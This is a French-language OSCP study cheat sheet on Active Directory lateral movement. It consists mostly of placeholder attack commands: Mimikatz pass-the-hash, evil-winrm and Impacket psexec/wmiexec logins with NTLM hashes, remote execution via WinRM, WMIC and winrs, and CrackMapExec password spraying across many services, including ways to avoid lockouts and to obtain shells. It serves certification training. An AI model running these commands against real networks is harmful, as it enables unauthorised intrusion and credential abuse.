---
title: "OSCP · Active Directory : mouvement latéral"
description: "Référence des accès distants et protocoles entre hôtes Windows."
---

# OSCP · Active Directory : mouvement latéral

Référence des accès distants et protocoles entre hôtes Windows.


## Techniques et préparation


<p class="oscp-command-note">Exécuter un script PowerShell.</p>

```powershell
powershell -ExecutionPolicy Bypass -File [script].ps1
```


<p class="oscp-command-note">Examiner les données d&#x27;authentification avec Mimikatz.</p>

```powershell
mimikatz # sekurlsa::pth /user:<username> /domain:<domain> /ntlm:<NTLM_hash> /run:powershell

# You can then execute commands in the PowerShell session as if you were logged in as the other user, for example here we are moving to another system as the other user and running a shell:
.\PsExec.exe \\<target_system> cmd
```


### Evil-WinRM

Observer les permissions et la configuration de Windows.


<p class="oscp-command-note">Ouvrir une session distante WinRM.</p>

```bash
evil-winrm -u <username> -p <password> -i <target_ip>
```


```bash
# Use -S option to ignore SSL validation for insecure systems.
evil-winrm -i <target_ip> -u <username> -H <LM_hash>:<NTLM_hash>
# or
evil-winrm -i <target_ip> -u <username> -H 00000000000000000000000000000000:<NTLM_hash>
```


### PsExec


<p class="oscp-command-note">Exécuter une commande distante via SMB.</p>

```bash
impacket-psexec <username>:<password>@<target_ip>
```


```bash
impacket-psexec <username>@<target_ip> -hashes <LM_hash>:<NTLM_hash>
# or
impacket-psexec <username>@<target_ip> -hashes 00000000000000000000000000000000:<NTLM_hash>
```


### VMIExec


<p class="oscp-command-note">Exécuter une commande distante via WMI.</p>

```bash
impacket-wmiexec <username>:<password>@<target_ip>
```


```bash
impacket-wmiexec -hashes <LM_hash>:<NTLM_hash> <username>@<target_ip>
# or
impacket-wmiexec -hashes 00000000000000000000000000000000:<NTLM_hash> <username>@<target_ip>
```


## Depuis Windows

Observer les permissions et la configuration de Windows.


### DCOM (Distributed Component Object Model)


<p class="oscp-command-note">Lire une clé du Registre Windows.</p>

```powershell
Get-ItemProperty -Path "HKLM:\Software\Microsoft\OLE" -Name "DCOMServer"
```


**Paramètres et repères :**
`Invoke-Command`  


<p class="oscp-command-note">Script PowerShell dans la rubrique « DCOM (Distributed Component Object Model) ».</p>

```powershell
$targetIP = "<target_ip>"  # Replace with the actual target IP
$username = "<username>"    # Replace with the actual username
$password = "<password>"     # Replace with the actual password
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force
$credential = New-Object System.Management.Automation.PSCredential($username, $secureString)

Invoke-Command -ComputerName $targetIP -Credential $credential -ScriptBlock { ipconfig }
```


**Paramètres et repères :**
`vmiexec`  


<p class="oscp-command-note">Exécuter une commande distante via WMI.</p>

```bash
wmiexec.py <domain>/<username>:<password>@<target_ip>
# or
wmiexec.py <domain>/<username>@<target_ip> -hashes <LM_hash>:<NTLM_hash>
```


### PsExec




```bash
psexec.exe \\<target_ip> -u <username> -p <password> cmd
```


### WinRM

Observer les permissions et la configuration de Windows.


<p class="oscp-command-note">Script PowerShell dans la rubrique « WinRM ».</p>

```powershell
$username = '<username>';
$password = '<password>';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
New-PSSession -ComputerName <target_ip> -Credential $credential;
```


### WinRS




```powershell
winrs -r:<target_ip> -u:<username> -p:<password> "<command>"
```


### WMIC


<p class="oscp-command-note">Interroger les informations système via WMI.</p>

```powershell
wmic /node:<target_ip> /user:<username> /password:<password> process call create "<command>"
```


## Credential Spraying with CrackMapExec

Vérifier les comptes, les secrets et les mécanismes d'authentification.


### Tips for Credential Spraying

Vérifier les comptes, les secrets et les mécanismes d'authentification.


**Paramètres et repères :**
`--delay` (délai) · `--max-retries` (limite des tentatives)  


<p class="oscp-command-note">Examiner les objets exposés par RPC.</p>

```bash
# Check policies with a tool like rpcclient
rpcclient -U "" <DOMAIN_IP> -c "getdompwinfo"

# Test multiple passwords with a delay to avoid lockouts
crackmapexec smb <DOMAIN_IP> -d <DOMAIN_NAME> -u users.txt -p passwords.txt --spray --delay 5

# Test multiple passwords with a max retries limit to avoid lockouts
crackmapexec smb <TARGET_IP> -u users.txt -p passwords.txt --max-retries 3
```


<p class="oscp-command-note">Examiner un service Windows avec CrackMapExec.</p>

```bash
# Use CrackMapExec's --target option to narrow focus
crackmapexec smb <TARGET_IP> --target-ips subdomains.txt -u users.txt -p passwords.txt
```


**Paramètres et repères :**
`--local-auth` (authentification locale)  




```bash
crackmapexec smb <TARGET_IP> -u <USERNAME> -p <PASSWORD> -d <DOMAIN_NAME> > output.log
```


```bash
crackmapexec smb <IP_list>.txt -u <USERNAME> -p <PASSWORD> -d <DOMAIN_NAME>
```


```bash
crackmapexec ldap <DOMAIN_CONTROLLER_IP> -u <USERNAME> -p <PASSWORD> --users
```


```bash
crackmapexec rdp <TARGET_IP> -u users.txt -p <PASSWORD>
```


<p class="oscp-command-note">Scanner les ports et services avec Nmap.</p>

```bash
nmap -p 5985,1433,445,3389 <TARGET_IP>
```


**Paramètres et repères :**
`-p` · `-H`  


<p class="oscp-command-note">Examiner un service Windows avec CrackMapExec.</p>

```bash
# Test both passwords and NTLM hashes
crackmapexec smb <DOMAIN_IP> -u users.txt -p passwords.txt -H hashes.txt -d <DOMAIN_NAME>
```


### SMB

Examiner les objets, les droits et les services du domaine.


<p class="oscp-command-note">Examiner un service Windows avec CrackMapExec.</p>

```bash
# Test a single password across all users in the domain
crackmapexec smb <DOMAIN_IP> -d <DOMAIN_NAME> -u users.txt -p <PASSWORD> --spray --delay 5

# Test multiple passwords with a delay to avoid lockouts
crackmapexec smb <DOMAIN_IP> -d <DOMAIN_NAME> -u users.txt -p passwords.txt --spray --delay 5
```


```bash
# Enumerate subdomains with valid credentials and test credentials (for example a workstation specific domain, like workstation1.domain.com)
crackmapexec smb <SUBDOMAIN_IP> -d <SUBDOMAIN_NAME> -u users.txt -p <PASSWORD>
```


```bash
# Test credentials against local accounts not part of the domain
crackmapexec smb <IP> -u local_users.txt -p <PASSWORD> --local-auth
```


```bash
# Execute a command on a remote machine with valid credentials
crackmapexec smb <DOMAIN_IP> -u <USERNAME> -p <PASSWORD> -d <DOMAIN_NAME> -x "whoami"

# Using NTLM hash
crackmapexec smb <DOMAIN_IP> -u <USERNAME> -H <NTLM_HASH> -d <DOMAIN_NAME> -x "whoami"
```


### WinRM (Windows Remote Management)

Observer les permissions et la configuration de Windows.


<p class="oscp-command-note">Examiner un service Windows avec CrackMapExec.</p>

```bash
# Test credentials on the main domain via WinRM
crackmapexec winrm <DOMAIN_CONTROLLER_IP> -u <USERNAME> -p <PASSWORD> -d <DOMAIN_NAME> --spray --delay 5

# Test NTLM hash
crackmapexec winrm <DOMAIN_CONTROLLER_IP> -u <USERNAME> -H <NTLM_HASH> -d <DOMAIN_NAME> --spray --delay 5

# Execute a command
crackmapexec winrm <DOMAIN_CONTROLLER_IP> -u <USERNAME> -p <PASSWORD> -d <DOMAIN_NAME> -x "whoami"
```


```bash
# Enumerate subdomains with valid credentials and test credentials (for example a workstation specific domain, like workstation1.domain.com). Authenticate on a subdomain
crackmapexec winrm <SUBDOMAIN_CONTROLLER_IP> -u <USERNAME> -p <PASSWORD> -d <SUBDOMAIN_NAME>

# Using NTLM hash
crackmapexec winrm <SUBDOMAIN_CONTROLLER_IP> -u <USERNAME> -H <NTLM_HASH> -d <SUBDOMAIN_NAME>
```


```bash
# Authenticate with a local user account
crackmapexec winrm <TARGET_IP> -u <LOCAL_USER> -p <PASSWORD> --local-auth

# Using NTLM hash
crackmapexec winrm <TARGET_IP> -u <LOCAL_USER> -H <NTLM_HASH> --local-auth
```


```bash
# Execute a command remotely
crackmapexec winrm <TARGET_IP> -u <USERNAME> -p <PASSWORD> -d <DOMAIN_NAME> -x "ipconfig"

# Using an NTLM hash
crackmapexec winrm <TARGET_IP> -u <USERNAME> -H <NTLM_HASH> -d <DOMAIN_NAME> -x "ipconfig"
```


### PsExec (SMB-Based Lateral Movement)

Examiner les objets, les droits et les services du domaine.


<p class="oscp-command-note">Examiner un service Windows avec CrackMapExec.</p>

```bash
# Gain a shell using valid credentials
crackmapexec smb <DOMAIN_IP> -u <USERNAME> -p <PASSWORD> -d <DOMAIN_NAME> --exec-method smbexec

# Gain a shell using NTLM hash
crackmapexec smb <DOMAIN_IP> -u <USERNAME> -H <NTLM_HASH> -d <DOMAIN_NAME> --exec-method smbexec
```


```bash
# Execute a remote command
crackmapexec smb <TARGET_IP> -u <USERNAME> -p <PASSWORD> -d <DOMAIN_NAME> -x "whoami"

# Using an NTLM hash
crackmapexec smb <TARGET_IP> -u <USERNAME> -H <NTLM_HASH> -d <DOMAIN_NAME> -x "whoami"
```


### VMIExec


<p class="oscp-command-note">Examiner un service Windows avec CrackMapExec.</p>

```bash
# Gain a shell using valid credentials
crackmapexec smb <DOMAIN_IP> -u <USERNAME> -p <PASSWORD> -d <DOMAIN_NAME> --exec-method wmiexec

# Gain a shell using NTLM hash
crackmapexec smb <DOMAIN_IP> -u <USERNAME> -H <NTLM_HASH> -d <DOMAIN_NAME> --exec-method wmiexec
```


### LDAP (Lightweight Directory Access Protocol)

Examiner les objets, les droits et les services du domaine.


<p class="oscp-command-note">Examiner un service Windows avec CrackMapExec.</p>

```bash
# Authenticate and enumerate users on the main domain
crackmapexec ldap <DOMAIN_CONTROLLER_IP> -u <USERNAME> -p <PASSWORD> -d <DOMAIN_NAME>

# Using NTLM hash
crackmapexec ldap <DOMAIN_CONTROLLER_IP> -u <USERNAME> -H <NTLM_HASH> -d <DOMAIN_NAME>
```


```bash
# Enumerate users on a subdomain
crackmapexec ldap <SUBDOMAIN_CONTROLLER_IP> -u <USERNAME> -p <PASSWORD> -d <SUBDOMAIN_NAME>

# Using NTLM hash
crackmapexec ldap <SUBDOMAIN_CONTROLLER_IP> -u <USERNAME> -H <NTLM_HASH> -d <SUBDOMAIN_NAME>
```


### MSSQL (Microsoft SQL Server)

Examiner les connexions, la configuration et les requêtes de la base de données.


<p class="oscp-command-note">Examiner un service Windows avec CrackMapExec.</p>

```bash
# Test main domain credentials on an MSSQL server
crackmapexec mssql <DOMAIN_CONTROLLER_IP> -u <USERNAME> -p <PASSWORD> -d <DOMAIN_NAME>

# Using NTLM hash
crackmapexec mssql <DOMAIN_CONTROLLER_IP> -u <USERNAME> -H <NTLM_HASH> -d <DOMAIN_NAME>
```


```bash
# Test credentials on a subdomain MSSQL server
crackmapexec mssql <SUBDOMAIN_IP> -u <USERNAME> -p <PASSWORD> -d <SUBDOMAIN_NAME>

# Using NTLM hash
crackmapexec mssql <SUBDOMAIN_IP> -u <USERNAME> -H <NTLM_HASH> -d <SUBDOMAIN_NAME>
```


```bash
# Test local user credentials on MSSQL
crackmapexec mssql <TARGET_IP> -u <LOCAL_USER> -p <PASSWORD> --local-auth

# Using NTLM hash
crackmapexec mssql <TARGET_IP> -u <LOCAL_USER> -H <NTLM_HASH> --local-auth
```


### RDP


<p class="oscp-command-note">Examiner un service Windows avec CrackMapExec.</p>

```bash
# Test credentials against an RDP service on the main domain
crackmapexec rdp <DOMAIN_CONTROLLER_IP> -u <USERNAME> -p <PASSWORD> -d <DOMAIN_NAME>

# Using NTLM hash
crackmapexec rdp <DOMAIN_CONTROLLER_IP> -u <USERNAME> -H <NTLM_HASH> -d <DOMAIN_NAME>
```


```bash
# Test credentials on an RDP service in a subdomain
crackmapexec rdp <SUBDOMAIN_IP> -u <USERNAME> -p <PASSWORD> -d <SUBDOMAIN_NAME>

# Using NTLM hash
crackmapexec rdp <SUBDOMAIN_IP> -u <USERNAME> -H <NTLM_HASH> -d <SUBDOMAIN_NAME>
```


```bash
# Authenticate to RDP with local credentials
crackmapexec rdp <TARGET_IP> -u <LOCAL_USER> -p <PASSWORD> --local-auth

# Using NTLM hash
crackmapexec rdp <TARGET_IP> -u <LOCAL_USER> -H <NTLM_HASH> --local-auth
```


### FTP

Transférer ou récupérer des fichiers dans le laboratoire.


<p class="oscp-command-note">Examiner un service Windows avec CrackMapExec.</p>

```bash
crackmapexec ftp <TARGET_IP> -u <USERNAME> -p <PASSWORD>
```


### SSH


<p class="oscp-command-note">Examiner un service Windows avec CrackMapExec.</p>

```bash
crackmapexec ssh <TARGET_IP> -u <USERNAME> -p <PASSWORD>
```


### HTTP

Examiner les entrées et les réponses de l'application web.


<p class="oscp-command-note">Examiner un service Windows avec CrackMapExec.</p>

```bash
crackmapexec http <TARGET_IP> -u <USERNAME> -p <PASSWORD>
```

---

Source documentaire : [OSCP+ Cheatsheet d'Emmanuel Solis](https://www.emmanuelsolis.com/oscp.html).

<!-- refined-oscp -->
